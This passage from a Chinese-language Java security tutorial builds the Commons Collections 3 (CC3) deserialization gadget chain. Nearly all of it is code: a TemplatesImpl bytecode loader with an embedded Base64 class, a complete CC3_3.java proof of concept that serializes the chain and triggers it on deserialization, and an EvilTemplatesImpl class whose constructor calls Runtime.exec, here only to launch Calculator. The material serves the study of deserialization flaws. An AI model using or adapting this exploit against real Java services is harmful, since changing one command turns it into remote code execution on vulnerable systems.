        byte[] code = Base64.getDecoder().decode("yv66vgAAADQAIQoABgASCQATABQIABUKABYAFwcAGAcAGQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAaAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgEAAygpVgEAClNvdXJjZUZpbGUBABdIZWxsb1RlbXBsYXRlc0ltcGwuamF2YQwADgAPBwAbDAAcAB0BABNIZWxsbyBUZW1wbGF0ZXNJbXBsBwAeDAAfACABABJIZWxsb1RlbXBsYXRlc0ltcGwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWACEABQAGAAAAAAADAAEABwAIAAIACQAAABkAAAADAAAAAbEAAAABAAoAAAAGAAEAAAAIAAsAAAAEAAEADAABAAcADQACAAkAAAAZAAAABAAAAAGxAAAAAQAKAAAABgABAAAACgALAAAABAABAAwAAQAOAA8AAQAJAAAALQACAAEAAAANKrcAAbIAAhIDtgAEsQAAAAEACgAAAA4AAwAAAA0ABAAOAAwADwABABAAAAACABE=");
        TemplatesImpl obj = new TemplatesImpl();
        setFieldValue(obj, "_bytecodes", new byte[][] {code});
        setFieldValue(obj, "_name", "HelloTemplatesImpl");
        setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());
        obj.newTransformer();

//        Transformer[] transformers = new Transformer[] {
//                //返回TemplatesImpl对象
//                new ConstantTransformer(obj),
//                //调用TemplatesImpl#newTransformer生成Transformer对象
//                new InvokerTransformer("newTransformer",null,null),
//        };

        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(TrAXFilter.class),
                new InstantiateTransformer(
                        new Class[] { Templates.class },
                        new Object[] { obj } )
		};

        Transformer transformerChain = new ChainedTransformer(transformers);

        Map innerMap = new HashMap();
        Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);
        outerMap.put("test", "1234");

    }
}

```

<div align=center><img src="https://user-images.githubusercontent.com/84888757/206002077-9f888f23-1367-43d0-8fda-b4824eda6827.png" /></div>


加上序列化和反序列化，最终的 `CC3 POC` 如下：

📒 `CC3_3.java`

```java
package org.vulhub.Ser;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.map.TransformedMap;
import javassist.ClassPool;

import javax.xml.transform.Templates;
import java.io.*;
import java.lang.annotation.Retention;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.util.HashMap;
import java.util.Map;

public class CC3_3 {
    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }

    public static void main(String[] args) throws Exception {
        TemplatesImpl obj = new TemplatesImpl();
        setFieldValue(obj, "_bytecodes", new byte[][]{
                ClassPool.getDefault().get(evil.EvilTemplatesImpl.class.getName()).toBytecode()
        });
        setFieldValue(obj, "_name", "HelloTemplatesImpl");
        setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());

        Transformer[] fakeTransformers = new Transformer[] {new ConstantTransformer(1)};
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(TrAXFilter.class),
                new InstantiateTransformer(
                        new Class[] { Templates.class },
                        new Object[] { obj })
        };

        Transformer transformerChain = new ChainedTransformer(fakeTransformers);

        Map innerMap = new HashMap();
        innerMap.put("value", "xxxx");
        Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);

        Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor construct = clazz.getDeclaredConstructor(Class.class, Map.class);
        construct.setAccessible(true);
        InvocationHandler handler = (InvocationHandler) construct.newInstance(Retention.class, outerMap);

        setFieldValue(transformerChain, "iTransformers", transformers);

//        // ==================
//        // 生成序列化字符串
//        ByteArrayOutputStream barr = new ByteArrayOutputStream();
//        ObjectOutputStream oos = new ObjectOutputStream(barr);
//        oos.writeObject(handler);
//        oos.close();
//
//        // 本地测试触发
//        // System.out.println(barr);
//        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));
////        ois.readObject();
//        Object o = (Object) ois.readObject();



        // 序列化
        serialize(handler);
        // 反序列化
        unserialize("ser_CC3_3.bin");

    }

    public static void serialize(Object handler) throws IOException {
        FileOutputStream fileOutputStream = new FileOutputStream("./ser_CC3_3.bin");
        ObjectOutputStream outputStream = new ObjectOutputStream(fileOutputStream);
        outputStream.writeObject(handler);
        outputStream.close();
        fileOutputStream.close();
    }

    public static void unserialize(String args) throws IOException, ClassNotFoundException {
        FileInputStream fileInputStream = new FileInputStream(args);
        ObjectInputStream ois = new ObjectInputStream(fileInputStream);

        ois.readObject();
    }
}
```

![image](https://user-images.githubusercontent.com/84888757/206002608-016b2fa2-5622-4289-bcec-d69861c7665d.png)


附上 `evil.EvilTemplatesImpl.java`：

📒 `evil.EvilTemplatesImpl.java`
```java
package evil;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

public class EvilTemplatesImpl extends AbstractTranslet {
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {}

    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {}

    public EvilTemplatesImpl() throws Exception {
        super();
        System.out.println("Hello TemplatesImpl");
        Runtime.getRuntime().exec("/System/Applications/Calculator.app/Contents/MacOS/Calculator");
    }

}
```


# 0x04 参考链接
- [Java安全漫谈 - 13.Java中动态加载字节码的那些方法](https://t.zsxq.com/E2VfUVB)
- [Java安全漫谈 - 14.为什么需要CommonsCollections3](https://t.zsxq.com/i6Y7QN7)




